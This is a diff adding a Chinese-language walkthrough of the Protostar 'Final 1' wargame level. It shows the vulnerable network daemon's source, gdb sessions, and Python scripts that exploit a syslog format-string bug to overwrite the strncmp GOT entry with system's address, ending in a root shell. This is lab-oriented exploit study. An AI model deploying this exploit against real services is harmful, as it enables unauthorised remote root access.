@@ -242,3 +242,278 @@ root
 exit
 *** Connection closed by remote host ***
 ```
+
+## Final 1
+
+> The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number.
+
+```c
+#include "../common/common.c"
+
+#include <syslog.h>
+
+#define NAME "final1"
+#define UID 0
+#define GID 0
+#define PORT 2994
+
+char username[128];
+char hostname[64];
+
+void logit(char *pw)
+{
+  char buf[512];
+
+  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
+
+  syslog(LOG_USER|LOG_DEBUG, buf);
+  // void syslog(int priority, const char *format, ...);
+  // buf is the format string! 0v0
+}
+
+void trim(char *str)
+{
+  char *q;
+
+  q = strchr(str, '\r');
+  if(q) *q = 0;
+  q = strchr(str, '\n');
+  if(q) *q = 0;
+}
+
+void parser()
+{
+  char line[128];
+
+  printf("[final1] $ ");
+
+  while(fgets(line, sizeof(line)-1, stdin)) {
+      trim(line);
+      if(strncmp(line, "username ", 9) == 0) {
+          strcpy(username, line+9);
+      } else if(strncmp(line, "login ", 6) == 0) {
+          if(username[0] == 0) {
+              printf("invalid protocol\n");
+          } else {
+              logit(line + 6);
+              printf("login failed\n");
+          }
+      }
+      printf("[final1] $ ");
+  }
+}
+
+void getipport()
+{
+  int l;
+  struct sockaddr_in sin;
+//   struct sockaddr_in {
+//     sa_family_t    sin_family; /* address family: AF_INET */
+//     in_port_t      sin_port;   /* port in network byte order */
+//     struct in_addr sin_addr;   /* internet address */
+//   };
+
+//   /* Internet address. */
+//   struct in_addr {
+//     uint32_t       s_addr;     /* address in network byte order */
+//   };
+
+  l = sizeof(struct sockaddr_in);
+  // int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+  // getpeername()  returns  the address of the peer connected to the socket sockfd, in the buffer pointed to by addr.
+  if(getpeername(0, &sin, &l) == -1) {
+      err(1, "you don't exist");
+  }
+
+  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  getipport();
+  parser();
+}
+```
+
+- 正确使用 `login` 后可以在 `/var/log/syslog` 中看到登录尝试日志<br>
+![Login from 127.0.0.1:34101 as [yanhui] with password [test]](img/final0.jpg)
+
+- 看上去似乎没有可控制的 `printf`，但 `syslog` 类似于 `printf`，第二个参数为格式化字符串，因而可以通过 `username` 和 `pw` 来控制，接下来可以修改 `strncmp` 函数 GOT 表的条目地址
+- 获取 `strncmp` 函数 GOT 表的条目地址
+
+    ```bash
+    # gdb --pid `pidof final1`
+    (gdb) info functions strncmp
+    All functions matching regular expression "strncmp":
+
+    File strncmp.c:
+    int *__GI_strncmp(const char *, const char *, size_t);
+
+    File ../sysdeps/i386/i486/bits/string.h:
+    int __strncmp_g(const char *, const char *, size_t);
+
+    Non-debugging symbols:
+    0x08048d9c  strncmp
+    0x08048d9c  strncmp@plt
+    Current language:  auto
+    The current source language is "auto; currently asm".
+    (gdb) x/2i 0x08048d9c
+    0x8048d9c <strncmp@plt>:	jmp    *0x804a1a8
+    0x8048da2 <strncmp@plt+6>:	push   $0x160
+    (gdb) x/wx 0x804a1a8
+    0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:	0x08048da2
+    ```
+
+- 获取 `system` 函数的地址
+    - > On a real modern system you would first have to leak addresses from memory in order to calculate offsets and break ASLR
+
+    ```bash
+    (gdb) x system  # part of libc
+    0xb7ecffb0 <__libc_system>:	0x890cec83
+    ```
+
+- 观察输入字符串在栈中的位置
+
+    ```bash
+    $ nc 127.0.0.1 2994
+    [final1] $ username AAAA %x %x %x %x %x %x %x %x
+    [final1] $ login BBBB %x %x %x %x %x %x %x %x
+    login failed
+    [final1] $ ^C
+    ```
+
+    ![tail -n 5 /var/log/syslog](img/final1.jpg)
+
+- 最短 `hostname` 为 `x.x.x.x:x`（长度为 $9$），最长 `hostname` 为 `xxx.xxx.xxx.xxx:xxxxx`（长度为 $21$），为了对齐，需要进行填充，根据 `hostname` 的长度范围可以统一填充到 $24$ 字节，这样一来就可以固定写入第 $17$ 个参数所指向的地址
+
+    ```py
+    import socket, struct
+
+    def read_util(check):
+        buf = ''
+        while check not in buf:
+            buf += s.recv(1)
+        return buf
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('localhost', 2994))
+
+    ip, port = s.getsockname()
+    hostname = ip + ':' + str(port) # 降低变长 hostname 的影响
+    pad = 'A' * (24 - len(hostname))
+    username = pad + 'BBBB' + '%08x ' * 20
+    login = 'CCCC'
+
+    print read_util('[final1] $')
+    s.send('username ' + username + '\n')
+    print read_util('[final1] $')
+    s.send('login ' + login + '\n')
+    print read_util('[final1] $')
+    ```
+
+    ![BBBB 对应第 17 个参数](img/final2.jpg)
+
+- 接下来查看已打印字符数量，并确定剩余需要字符的数量
+
+    ```py
+    import socket, struct
+
+    def read_util(check):
+        buf = ''
+        while check not in buf:
+            buf += s.recv(1)
+        return buf
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('localhost', 2994))
+
+    strncmp = struct.pack('I', 0x804a1a8)
+    ip, port = s.getsockname()
+    hostname = ip + ':' + str(port)
+    pad = 'A' * (24 - len(hostname))
+    username = pad + 'BBBB' + strncmp + '%18$n'
+    login = 'CCCC'
+
+    print read_util('[final1] $')
+    s.send('username ' + username + '\n')
+    print read_util('[final1] $')
+    s.send('login ' + login + '\n')
+    print read_util('[final1] $')
+    raw_input('waiting... hit [enter]')
+    ```
+
+    ```bash
+    $ python final.py 
+    [final1] $
+    [final1] $
+    login failed
+    [final1] $
+    waiting... hit [enter]
+
+    # open another terminal
+    # pidof final1
+    21600 1516
+    # gdb --pid 21600
+    (gdb) x/wx 0x804a1a8
+    0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:	0x00000030
+    Current language:  auto
+    The current source language is "auto; currently asm".
+    ```
+
+### Exploit
+
+```py
+import socket, struct, telnetlib
+
+def read_util(check):
+    buf = ''
+    while check not in buf:
+        buf += s.recv(1)
+    return buf
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 2994))
+
+strncmp_got = 0x804a1a8
+
+ip, port = s.getsockname()
+hostname = ip + ':' + str(port)
+pad = 'A' * (24 - len(hostname))
+username = pad + struct.pack('I', strncmp_got) + struct.pack('I', strncmp_got + 2) + '%65408x' + '%17$n' + '%47164x' + '%18$n'
+# 65408 = 0xffb0 - 0x30
+# 47164 = 0xb7ec - 0xffb0
+login = 'CCCC'
+
+print read_util('[final1] $')
+s.send('username ' + username + '\n')
+print read_util('[final1] $')
+s.send('login ' + login + '\n')
+print read_util('[final1] $')
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+```bash
+$ python final.py 
+[final1] $
+ [final1] $
+ login failed
+[final1] $
+ id
+uid=0(root) gid=0(root) groups=0(root)
+[final1] $ whoami
+root
+```
